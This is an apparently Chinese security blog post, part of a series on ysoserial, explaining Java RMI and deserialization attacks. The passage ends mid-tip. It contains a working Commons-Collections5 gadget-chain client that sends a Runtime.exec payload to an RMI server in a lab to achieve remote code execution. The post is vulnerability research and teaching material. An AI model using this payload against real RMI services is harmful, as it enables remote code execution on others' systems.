<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Ysoserial工具解读（六） | Linf3ng's Blog</title><meta name="keywords" content="Java,RCE,反序列化"><meta name="author" content="L1nf3ng"><meta name="copyright" content="L1nf3ng"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="这一篇主要讲述Java RMI（及其实现协议JRMP）相关的反序列化漏洞，内容有点多，断断续续地写了一个月。文章里预测的几种攻击方式几乎都得到了验证，但通过RMI从服务端攻击客户端的实验目前失败了（具体原因还在探寻中），而Ysoserial则利用JRMP的DGC协议实现。">
<meta property="og:type" content="article">
<meta property="og:title" content="Ysoserial工具解读（六）">
<meta property="og:url" content="http://example.com/2019/11/19/Ysoserial%E5%B7%A5%E5%85%B7%E8%A7%A3%E8%AF%BB%EF%BC%88%E5%85%AD%EF%BC%89/index.html">
<meta property="og:site_name" content="Linf3ng&#39;s Blog">
<meta property="og:description" content="这一篇主要讲述Java RMI（及其实现协议JRMP）相关的反序列化漏洞，内容有点多，断断续续地写了一个月。文章里预测的几种攻击方式几乎都得到了验证，但通过RMI从服务端攻击客户端的实验目前失败了（具体原因还在探寻中），而Ysoserial则利用JRMP的DGC协议实现。">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://example.com/2019/11/19/Ysoserial%E5%B7%A5%E5%85%B7%E8%A7%A3%E8%AF%BB%EF%BC%88%E5%85%AD%EF%BC%89/java_cover.png">
<meta property="article:published_time" content="2019-11-19T06:45:24.000Z">
<meta property="article:modified_time" content="2021-03-29T18:35:28.347Z">
<meta property="article:author" content="L1nf3ng">
<meta property="article:tag" content="Java">
<meta property="article:tag" content="RCE">
<meta property="article:tag" content="反序列化">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://example.com/2019/11/19/Ysoserial%E5%B7%A5%E5%85%B7%E8%A7%A3%E8%AF%BB%EF%BC%88%E5%85%AD%EF%BC%89/java_cover.png"><link rel="shortcut icon" href="/img/panda.ico"><link rel="canonical" href="http://example.com/2019/11/19/Ysoserial%E5%B7%A5%E5%85%B7%E8%A7%A3%E8%AF%BB%EF%BC%88%E5%85%AD%EF%BC%89/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
    },
    fancybox: {
      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isanchor: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = { 
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2021-03-30 02:35:28'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    })(window)</script><meta name="generator" content="Hexo 5.4.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="author-avatar"><img class="avatar-img" src="/img/Mantus.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">13</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">标签</div><div class="length-num">12</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/categories/"><div class="headline">分类</div><div class="length-num">2</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 清单</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/books/"><i class="fa-fw fas fa-video"></i><span> 书籍</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/2019/11/19/Ysoserial%E5%B7%A5%E5%85%B7%E8%A7%A3%E8%AF%BB%EF%BC%88%E5%85%AD%EF%BC%89/java_cover.png')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Linf3ng's Blog</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 清单</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/books/"><i class="fa-fw fas fa-video"></i><span> 书籍</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">Ysoserial工具解读（六）</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2019-11-19T06:45:24.000Z" title="发表于 2019-11-19 14:45:24">2019-11-19</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2021-03-29T18:35:28.347Z" title="更新于 2021-03-30 02:35:28">2021-03-30</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">漏洞分析</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="Ysoserial工具解读（六）"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p>这一篇主要讲述Java RMI（及其实现协议JRMP）相关的反序列化漏洞，内容有点多，断断续续地写了一个月。文章里预测的几种攻击方式几乎都得到了验证，但通过RMI从服务端攻击客户端的实验目前失败了（具体原因还在探寻中），而Ysoserial则利用JRMP的DGC协议实现。</p>
<span id="more"></span>

<h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><h3 id="RMI是什么"><a href="#RMI是什么" class="headerlink" title="RMI是什么"></a>RMI是什么</h3><p>RMI（Remote Method Invocation，远程方法调用）类似于RPC（Remote Process Call，远程过程调用），常被用在分布式环境中（如阿里的Dubbo框架）。假设A主机需要处理大量的计算任务，而B主机这会儿没有任务，这时可以用RMI将一部分任务分给B来做，提高效率。</p>
<p>客户端（A主机）和服务端（B主机）之间的通信实际交给位于各自JVM的Stub（存根）和Skeleton（不知道怎么翻译，但官方说明jdk8以后不再依赖这个组件）执行，而在这期间，RMI registry注册表扮演着图书管理员的角色。具体的实现过程如下图：</p>
<ol>
<li>当Server有一个Service对象提供给外部调用时，它需要先向注册表登记</li>
<li>当Client需要调用Service对象时，就要先去注册表查询可用的对象名称</li>
<li>注册表会将该对象的存根Stub发送给Client</li>
<li>Client根据事先获知的接口调用需要的方法，参数实际上是交给了自己JVM中的Stub</li>
<li>Stub会将参数序列化后发送给Server上的JVM中的Skeleton</li>
<li>Skeleton将参数反序列化后呈递给Service对象</li>
<li>JVM结合方法声明和参数并将运算结果返回Skeleton</li>
<li>Skeleton再将运算结果发送给Client对象</li>
</ol>
<p><img src="rmi.JPG"></p>
<h3 id="代码示例"><a href="#代码示例" class="headerlink" title="代码示例"></a>代码示例</h3><p>要求：Server端和Client端之间共享一个接口。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">**	通用接口：</span></span><br><span class="line"><span class="comment">**/</span></span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"></span><br><span class="line"><span class="comment">//远程接口</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">ImInterface</span> <span class="keyword">extends</span> <span class="title">Remote</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">hello</span><span class="params">(String a)</span> <span class="keyword">throws</span> RemoteException</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以用<code>javac</code>将编译成class文件发给对方，或者直接告诉其源码内容（类名称、方法名称必须相同）</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">**	Server端：Rmf_server.java</span></span><br><span class="line"><span class="comment">**/</span></span><br><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.UnicastRemoteObject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Rmf_server</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RemoteHelloWorld</span> <span class="keyword">extends</span> <span class="title">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title">ImInterface</span> </span>&#123;</span><br><span class="line">        <span class="function"><span class="keyword">private</span> <span class="title">RemoteHelloWorld</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException </span>&#123;</span><br><span class="line">            <span class="keyword">super</span>();</span><br><span class="line">            System.out.println(<span class="string">&quot;you&#x27;re in construction.&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> String <span class="title">hello</span><span class="params">(String a)</span> <span class="keyword">throws</span> RemoteException </span>&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;call from&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Hello world&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//注册远程对象</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">start</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">//远程对象实例</span></span><br><span class="line">        RemoteHelloWorld h = <span class="keyword">new</span> RemoteHelloWorld();</span><br><span class="line">        <span class="comment">//创建注册中心</span></span><br><span class="line">        Registry registry = LocateRegistry.createRegistry(<span class="number">5599</span>);</span><br><span class="line">        <span class="comment">//绑定对象实例到注册中心</span></span><br><span class="line">        registry.bind(<span class="string">&quot;Hello&quot;</span>, h);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span><span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        <span class="keyword">new</span> Rmf_server().start();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">**	Client端：HappyEnding.java</span></span><br><span class="line"><span class="comment">**/</span></span><br><span class="line"><span class="keyword">import</span> java.lang.System;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HappyEnding</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">// list()方法用来查询目标主机上注册机中可用的对象名</span></span><br><span class="line">        String[] names = Naming.list(<span class="string">&quot;rmi://10.10.10.136:5599/&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span>( String name : names)&#123;</span><br><span class="line">            System.out.println(name);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// lookup()方法获取目标对象的Stub</span></span><br><span class="line">        ImInterface ss = (ImInterface)Naming.lookup(names[<span class="number">0</span>]);</span><br><span class="line">        String result = ss.hello(<span class="string">&quot;ni hao!&quot;</span>);</span><br><span class="line">        System.out.println(result);</span><br><span class="line"></span><br><span class="line">    &#125;        </span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在启动server端后，用client端去连，可以看到调用成功返回的结果：</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">F:\Studio&gt;java HappyEnding</span><br><span class="line">//<span class="number">10.10</span>.<span class="number">10.136</span>:<span class="number">5599</span>/Hello</span><br><span class="line">Hello world</span><br></pre></td></tr></table></figure>

<h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>为了模拟两机RMI通信，我在VMware上搭建了一个Linux系统（IP：10.10.10.136），宿主机为windows（IP：10.10.10.1）。因为该Linux系统中有VS code，我又装了个gradle来进行包管理。具体流程如下：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">// linux安装gradle</span><br><span class="line">sudo apt install gradle -y </span><br><span class="line"></span><br><span class="line">// vscode搜索Java Extension Package插件安装</span><br><span class="line"></span><br><span class="line">// 新建项目文件夹后，用vsc打开，并在终端中输入：</span><br><span class="line">gradle init --<span class="built_in">type</span> java-application</span><br><span class="line"></span><br><span class="line">// 修改build.gradle中的仓库地址，原地址jcenter()会指向google的服务器，国内无法连接</span><br><span class="line">// 建议使用阿里云的仓库</span><br><span class="line">/**</span><br><span class="line">**	build.gradle</span><br><span class="line">**/</span><br><span class="line">repositories &#123;</span><br><span class="line">    // Use jcenter <span class="keyword">for</span> resolving your dependencies.</span><br><span class="line">    // You can <span class="built_in">declare</span> any Maven/Ivy/file repository here.</span><br><span class="line">    // jcenter()</span><br><span class="line">    // mavenCentral()</span><br><span class="line">    maven &#123; url <span class="string">&#x27;http://maven.aliyun.com/nexus/content/groups/public&#x27;</span>&#125;</span><br><span class="line">    maven &#123; url <span class="string">&#x27;http://maven.aliyun.com/nexus/content/repositories/jcenter&#x27;</span>&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 跟gradle有关的命令：</span><br><span class="line">// 编译：</span><br><span class="line">gradle build --stacktrace</span><br><span class="line">// 运行：</span><br><span class="line">gradle run </span><br></pre></td></tr></table></figure>

<h2 id="利用姿势"><a href="#利用姿势" class="headerlink" title="利用姿势"></a>利用姿势</h2><p>RMI在启动和通信过程中存在多个序列化与反序列化过程，例如：Client在调用远程方法时会将参数序列化，Server在处理请求时会将参数反序列化；Server在绑定对象到注册机时会先序列化，注册机在登记并生成Stub时会反序列化；Server将结果返回给Client时也会进行序列化，Client再读取结果时再做反序列化操作。</p>
<p>因此，至少存在三种攻击方式。</p>
<h3 id="攻击Server——方法1"><a href="#攻击Server——方法1" class="headerlink" title="攻击Server——方法1"></a>攻击Server——方法1</h3><p>先来模拟下攻击Server的过程，既然在RMI通信过程中，Server会将我们（Client）提供的参数反序列化，那我们将恶意类作为参数发给Server，如果Server的classpath存在该恶意类的调用链，就能够形成远程代码执行。根据这一思路，我写了以下代码：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">**	Server端build.gradle</span></span><br><span class="line"><span class="comment">**/</span></span><br><span class="line">dependencies &#123;</span><br><span class="line">	<span class="comment">// 引入我们需要的有漏洞的jar包</span></span><br><span class="line">    compile group: <span class="string">&#x27;commons-collections&#x27;</span>, name: <span class="string">&#x27;commons-collections&#x27;</span>, version: <span class="string">&#x27;3.1&#x27;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>由于我在Linux服务器上装的jdk版本是1.8，所以直接将之前分析过的Commons-Collections5的payload源码拿过来用：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">**	Client端</span></span><br><span class="line"><span class="comment">**/</span></span><br><span class="line"><span class="keyword">import</span> java.lang.System;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HappyEnding</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        String[] names = Naming.list(<span class="string">&quot;rmi://10.10.10.136:5599/&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span>( String name : names)&#123;</span><br><span class="line">            System.out.println(name);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        ImInterface ss = (ImInterface)Naming.lookup(names[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// generate the payload</span></span><br><span class="line">         </span><br><span class="line">        <span class="keyword">final</span> String[] execArgs = <span class="keyword">new</span> String[] &#123; <span class="string">&quot;vlc&quot;</span> &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> Class[] &#123;</span><br><span class="line">                        String.class, Class[].class &#125;, <span class="keyword">new</span> Object[] &#123;</span><br><span class="line">                        <span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> Class[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> Class[] &#123;</span><br><span class="line">                        Object.class, Object[].class &#125;, <span class="keyword">new</span> Object[] &#123;</span><br><span class="line">                        <span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> Class[] &#123; String.class &#125;, execArgs),</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(<span class="number">1</span>) &#125;;</span><br><span class="line"></span><br><span class="line">        Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> Map lazyMap = LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line"></span><br><span class="line">		TiedMapEntry entry = <span class="keyword">new</span> TiedMapEntry(lazyMap, <span class="string">&quot;foo&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// =========================== 我是分隔符 ==================================</span></span><br><span class="line">		BadAttributeValueExpException val = <span class="keyword">new</span> BadAttributeValueExpException(<span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line">        Field valfield = val.getClass().getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">        valfield.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        valfield.set(val, entry);</span><br><span class="line">		<span class="comment">// ========================================================================</span></span><br><span class="line">        </span><br><span class="line">        String result = ss.hello(val);</span><br><span class="line"></span><br><span class="line">        System.out.println(result);</span><br><span class="line">    &#125;        </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>小提示1：</strong>为了方便，Client端我没有创建java项目，因此编译过程需要指定classpath才能完成编译。Windows中gradle默认的jar包下载目录在<code>C:\Users\xxxx\.gradle\caches\modules-2\files-2.1\</code>中，因此编译语句与执行语句如下：</p>
